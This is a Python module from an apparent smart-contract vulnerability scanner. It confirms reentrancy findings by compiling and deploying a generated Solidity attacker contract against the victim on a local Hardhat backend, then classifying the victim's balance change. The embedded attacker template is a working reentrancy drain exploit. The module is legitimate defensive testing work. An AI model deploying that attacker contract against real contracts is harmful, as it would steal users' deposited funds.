"""
Runtime validation scenario for reentrancy findings.

Strategy
~~~~~~~~
For each reentrancy finding, we:

1. Identify the vulnerable contract and withdraw-like function.
2. Generate an attacker contract that will:
   a. Deposit ETH into the victim.
   b. Call withdraw() to initiate the reentrancy attack.
   c. Re-enter withdraw() from its receive() callback.
3. Compile both victim source and attacker source together.
4. Deploy victim, fund it, deploy attacker, execute attack.
5. Observe whether the victim was drained (confirmed) or the
   attack reverted (not confirmed).

Honest classification
~~~~~~~~~~~~~~~~~~~~~
- **confirmed_by_runtime**: The attacker drained funds from the victim
  beyond the expected single-withdraw amount, or the victim's balance
  dropped to zero/near-zero after a reentrancy attack.
- **not_confirmed_by_runtime**: The attack transaction reverted or the
  victim's balance remains consistent (CEI or reentrancy guard worked).
- **inconclusive_runtime**: The attack succeeded but the balance evidence
  is ambiguous (e.g., balances don't show clear drain).
- **simulation_unsupported**: The finding's contract shape doesn't match
  what this scenario can deploy/test.
"""

import re
from typing import List, Optional

from simulation.compiler import CompiledContract, compile_source, CompilationError
from simulation.models import (
    RUNTIME_CONFIRMED,
    RUNTIME_FAILED,
    RUNTIME_INCONCLUSIVE,
    RUNTIME_NOT_CONFIRMED,
    RUNTIME_UNSUPPORTED,
    RuntimeActionResult,
    ValidationRecord,
)


# ── Constants ────────────────────────────────────────────────────────────────

WEI_PER_ETH = 10 ** 18
DEPOSIT_WEI = 2 * WEI_PER_ETH    # 2 ETH seeded into victim
ATTACK_WEI  = 1 * WEI_PER_ETH    # 1 ETH used by attacker


# ── Attacker Solidity template ───────────────────────────────────────────────

_ATTACKER_TEMPLATE = """
// Auto-generated attacker contract for Aegis reentrancy runtime validation.

interface IVictim {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract AegisReentrancyAttacker {
    IVictim public victim;
    uint256 public attackAmount;
    uint256 public reentrancyCount;

    constructor(address _victim) {
        victim = IVictim(_victim);
    }

    function attack() external payable {
        attackAmount = msg.value;
        reentrancyCount = 0;
        victim.deposit{value: msg.value}();
        victim.withdraw(msg.value);
    }

    receive() external payable {
        reentrancyCount++;
        if (address(victim).balance >= attackAmount) {
            victim.withdraw(attackAmount);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
"""


# ── Public API ───────────────────────────────────────────────────────────────

def validate_reentrancy(
    findings: list,
    compiled_contracts: List[CompiledContract],
    backend,
    source_code: str,
) -> List[ValidationRecord]:
    """Validate reentrancy findings by deploying attacker contracts.

    Parameters
    ----------
    findings:
        Full findings list from the scanner.
    compiled_contracts:
        Pre-compiled contracts from the victim source.
    backend:
        Running HardhatBackend instance.
    source_code:
        Raw victim Solidity source (needed to compile attacker alongside).

    Returns
    -------
    list[ValidationRecord]
        One record per reentrancy finding that was testable.
    """
    validations = []
    relevant = [f for f in findings if f.get("check") == "reentrancy"]
    accounts = backend.get_accounts()

    if not relevant:
        return validations

    for finding in relevant:
        record = _validate_one(finding, compiled_contracts, backend, source_code, accounts)
        validations.append(record)

    return validations


# ── Internal logic ───────────────────────────────────────────────────────────

def _validate_one(
    finding: dict,
    compiled_contracts: List[CompiledContract],
    backend,
    source_code: str,
    accounts: list,
) -> ValidationRecord:
    """Attempt reentrancy runtime validation for a single finding."""
    function_name = finding.get("function")
    contract_name = finding.get("contract_name")

    if not function_name:
        return ValidationRecord(
            finding_id=finding.get("id"),
            check="reentrancy",
            title=finding.get("vulnerability", "Reentrancy"),
            status=RUNTIME_UNSUPPORTED,
            backend=backend.backend_id,
            scenario="reentrancy.attacker_drain",
            error="Function name could not be determined from the static finding.",
            limitations=["Runtime validation requires a callable function name."],
        )

    # Find the victim contract in the compiled output.
    victim_compiled = _find_victim_contract(compiled_contracts, contract_name, function_name)
    if victim_compiled is None:
        return ValidationRecord(
            finding_id=finding.get("id"),
            check="reentrancy",
            title=finding.get("vulnerability", "Reentrancy"),
            status=RUNTIME_UNSUPPORTED,
            backend=backend.backend_id,
            scenario="reentrancy.attacker_drain",
            contract_name=contract_name,
            function_name=function_name,
            error="No deployable victim contract with a matching withdraw function was found.",
            limitations=["This scenario requires a contract with deposit() and a withdrawable function."],
        )

    # Check the victim has deposit() + the flagged function (withdraw-like).
    if not _has_function(victim_compiled, "deposit"):
        return ValidationRecord(
            finding_id=finding.get("id"),
            check="reentrancy",
            title=finding.get("vulnerability", "Reentrancy"),
            status=RUNTIME_UNSUPPORTED,
            backend=backend.backend_id,
            scenario="reentrancy.attacker_drain",
            contract_name=contract_name,
            function_name=function_name,
            error="Victim contract does not have a payable deposit() function, which is required for the attacker drain scenario.",
            limitations=["This scenario requires a deposit/withdraw pattern."],
        )

    # ── Compile attacker alongside victim ────────────────────────────────
    attacker_source = _build_attacker_source()
    combined_source = source_code + "\n" + attacker_source

    try:
        combined_compiled = compile_source(combined_source)
    except CompilationError as exc:
        return ValidationRecord(
            finding_id=finding.get("id"),
            check="reentrancy",
            title=finding.get("vulnerability", "Reentrancy"),
            status=RUNTIME_FAILED,
            backend=backend.backend_id,
            scenario="reentrancy.attacker_drain",
            contract_name=contract_name,
            function_name=function_name,
            error=f"Failed to compile attacker contract: {exc}",
            limitations=["The attacker contract could not be compiled alongside the victim."],
        )

    attacker_compiled = _find_contract_by_name(combined_compiled, "AegisReentrancyAttacker")
    victim_for_deploy = _find_victim_contract(combined_compiled, contract_name, function_name)

    if not attacker_compiled or not victim_for_deploy:
        return ValidationRecord(
            finding_id=finding.get("id"),
            check="reentrancy",
            title=finding.get("vulnerability", "Reentrancy"),
            status=RUNTIME_FAILED,
            backend=backend.backend_id,
            scenario="reentrancy.attacker_drain",
            contract_name=contract_name,
            function_name=function_name,
            error="Compiled output did not contain both attacker and victim contracts.",
        )

    # ── Deploy and attack ────────────────────────────────────────────────
    deployer = accounts[0]
    attacker_account = accounts[1] if len(accounts) > 1 else deployer
    actions = []

    try:
        # Step 1: Deploy victim.
        victim_deployment = backend.deploy_contract(
            victim_for_deploy.abi,
            victim_for_deploy.bytecode,
            _build_constructor_args(victim_for_deploy, accounts),
        )
        victim_address = victim_deployment["contract_address"]

        # Step 2: Seed victim with ETH (a legitimate user deposits).
        deposit_result = backend.execute_transaction(
            contract_abi=victim_for_deploy.abi,
            contract_address=victim_address,
            function_name="deposit",
            args=[],
            sender=deployer,
            value=DEPOSIT_WEI,
        )
        actions.append(RuntimeActionResult(
            status="setup",
            action="fund_victim_deposit",
            tx_hash=deposit_result.get("tx_hash"),
            reverted=deposit_result.get("reverted"),
            error=deposit_result.get("error"),
            account=deployer,
            function="deposit",
            details={"value_wei": DEPOSIT_WEI, "target": victim_address},
        ))

        if not deposit_result.get("success"):
            return _failed_record(
                finding, backend, contract_name, function_name, actions,
                "Seeding the victim with ETH via deposit() failed.",
            )

        # Step 3: Deploy attacker contract with victim address.
        attacker_deployment = backend.deploy_contract(
            attacker_compiled.abi,
            attacker_compiled.bytecode,
            [victim_address],
        )
        attacker_address = attacker_deployment["contract_address"]

        # Record balances before attack.
        victim_balance_before = backend.get_balance(victim_address)

        # Step 4: Execute the attack.
        attack_result = backend.execute_transaction(
            contract_abi=attacker_compiled.abi,
            contract_address=attacker_address,
            function_name="attack",
            args=[],
            sender=attacker_account,
            value=ATTACK_WEI,
        )
        actions.append(RuntimeActionResult(
            status=RUNTIME_CONFIRMED if attack_result.get("success") else RUNTIME_NOT_CONFIRMED,
            action="reentrancy_attack",
            tx_hash=attack_result.get("tx_hash"),
            reverted=attack_result.get("reverted"),
            error=attack_result.get("error"),
            account=attacker_account,
            function="attack",
            details={
                "attacker_contract": attacker_address,
                "victim_contract": victim_address,
                "attack_value_wei": ATTACK_WEI,
            },
        ))

        # Record balances after attack.
        victim_balance_after = backend.get_balance(victim_address)
        attacker_balance_after = backend.get_balance(attacker_address)

    except Exception as exc:
        return _failed_record(
            finding, backend, contract_name, function_name, actions,
            f"Unexpected error during reentrancy attack execution: {exc}",
        )

    # ── Classify the result ──────────────────────────────────────────────
    evidence = {
        "victim_contract": contract_name,
        "victim_address": victim_address,
        "attacker_contract": "AegisReentrancyAttacker",
        "attacker_address": attacker_address,
        "attacker_account": attacker_account,
        "function_tested": function_name,
        "attack_function": "attack",
        "deposit_amount_wei": str(DEPOSIT_WEI),
        "attack_amount_wei": str(ATTACK_WEI),
        "victim_balance_before_attack_wei": str(victim_balance_before),
        "victim_balance_after_attack_wei": str(victim_balance_after),
        "attacker_balance_after_wei": str(attacker_balance_after),
        "attack_tx_hash": attack_result.get("tx_hash"),
        "attack_reverted": attack_result.get("reverted"),
    }

    if attack_result.get("reverted") or not attack_result.get("success"):
        # Attack was blocked — reentrancy not confirmed.
        status = RUNTIME_NOT_CONFIRMED
        reason = (
            "The reentrancy attack transaction reverted. "
            "The victim contract's defenses (e.g., CEI pattern, reentrancy guard) "
            "prevented the exploit."
        )
        if attack_result.get("error"):
            reason += f" Revert reason: {attack_result['error']}"
    elif victim_balance_after == 0 and victim_balance_before > ATTACK_WEI:
        # Victim fully drained — reentrancy confirmed.
        status = RUNTIME_CONFIRMED
        drained = victim_balance_before - victim_balance_after
        reason = (
            f"The victim's balance dropped from {victim_balance_before} wei to 0 "
            f"after the reentrancy attack, indicating the attacker drained "
            f"{drained} wei through repeated withdraw() re-entry."
        )
    elif victim_balance_after < victim_balance_before - ATTACK_WEI:
        # Partial drain — still confirms reentrancy.
        status = RUNTIME_CONFIRMED
        drained = victim_balance_before - victim_balance_after
        expected = ATTACK_WEI
        reason = (
            f"The victim lost {drained} wei, which exceeds the "
            f"expected single-withdraw amount of {expected} wei. "
            f"This indicates successful reentrancy exploitation."
        )
    elif victim_balance_before - victim_balance_after == ATTACK_WEI:
        # Exactly one withdraw — inconclusive (could be normal behavior).
        status = RUNTIME_INCONCLUSIVE
        reason = (
            "The attack transaction succeeded, but the victim lost exactly the "
            "expected single-withdraw amount. This may indicate the reentrancy "
            "was not triggered or was mitigated after one iteration."
        )
    else:
        # Unexpected state.
        status = RUNTIME_INCONCLUSIVE
        reason = (
            f"Balance evidence is ambiguous. Victim before: {victim_balance_before}, "
            f"after: {victim_balance_after}. Could not definitively classify."
        )

    evidence["classification_reason"] = reason

    return ValidationRecord(
        finding_id=finding.get("id"),
        check="reentrancy",
        title=finding.get("vulnerability", "Reentrancy"),
        status=status,
        backend=backend.backend_id,
        scenario="reentrancy.attacker_drain",
        contract_name=contract_name,
        function_name=function_name,
        evidence=evidence,
        actions=actions,
        limitations=[
            "This scenario tests a deposit/withdraw reentrancy pattern only.",
            "Contracts without a payable deposit() function cannot be tested.",
            "The attacker contract is auto-generated and may not exploit all code paths.",
            "Only call-style reentrancy is tested; cross-function reentrancy is not covered.",
        ],
        error=None if status != RUNTIME_FAILED else reason,
    )


# ── Helpers ──────────────────────────────────────────────────────────────────

def _find_victim_contract(
    compiled_contracts: List[CompiledContract],
    contract_name: Optional[str],
    function_name: str,
) -> Optional[CompiledContract]:
    """Find the victim contract that matches the finding's contract_name or
    has the flagged function."""
    # First pass: match by contract name.
    if contract_name:
        for contract in compiled_contracts:
            if contract.contract_name == contract_name:
                if _has_function(contract, function_name):
                    return contract

    # Second pass: match by function name only.
    for contract in compiled_contracts:
        if contract.contract_name == "AegisReentrancyAttacker":
            continue  # Skip our own attacker.
        if _has_function(contract, function_name):
            return contract

    return None


def _find_contract_by_name(
    compiled_contracts: List[CompiledContract],
    name: str,
) -> Optional[CompiledContract]:
    for contract in compiled_contracts:
        if contract.contract_name == name:
            return contract
    return None


def _has_function(contract: CompiledContract, function_name: str) -> bool:
    return any(
        entry.get("type") == "function" and entry.get("name") == function_name
        for entry in contract.abi
    )


def _extract_pragma(source: str) -> str:
    """Extract the pragma line from the source, defaulting to ^0.8.0."""
    match = re.search(r"(pragma\s+solidity\s+[^;]+;)", source)
    if match:
        return match.group(1)
    return "pragma solidity ^0.8.0;"


def _build_attacker_source() -> str:
    return _ATTACKER_TEMPLATE


def _build_constructor_args(contract: CompiledContract, accounts: list) -> list:
    """Build constructor args for the victim contract (empty if no constructor)."""
    for entry in contract.abi:
        if entry.get("type") == "constructor":
            inputs = entry.get("inputs", [])
            if not inputs:
                return []
            # Simple arg builder for common types.
            args = []
            for inp in inputs:
                t = inp.get("type", "")
                if t == "address":
                    args.append(accounts[0])
                elif t.startswith("uint") or t.startswith("int"):
                    args.append(0)
                elif t == "bool":
                    args.append(False)
                elif t == "string":
                    args.append("")
                elif t.startswith("bytes"):
                    args.append(b"")
                else:
                    return []  # unsupported
            return args
    return []


def _failed_record(
    finding: dict,
    backend,
    contract_name: Optional[str],
    function_name: Optional[str],
    actions: list,
    error_msg: str,
) -> ValidationRecord:
    return ValidationRecord(
        finding_id=finding.get("id"),
        check="reentrancy",
        title=finding.get("vulnerability", "Reentrancy"),
        status=RUNTIME_FAILED,
        backend=backend.backend_id,
        scenario="reentrancy.attacker_drain",
        contract_name=contract_name,
        function_name=function_name,
        actions=actions,
        error=error_msg,
        limitations=["The reentrancy scenario failed before producing a classification."],
    )
